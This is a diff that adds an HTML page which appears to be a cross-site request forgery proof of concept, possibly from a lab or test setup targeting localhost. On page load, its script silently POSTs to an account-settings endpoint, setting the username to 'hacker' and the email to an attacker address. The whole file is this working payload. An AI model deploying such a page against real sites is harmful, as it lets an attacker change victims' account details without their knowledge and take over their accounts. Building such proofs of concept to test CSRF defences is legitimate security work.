@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="en">
+<body>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://localhost:8081/account/settings", true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+        var formData = "username=hacker&email=hacker@example.com";
+        xhr.send(formData);
+    });
+</script>
+</body>
+</html>
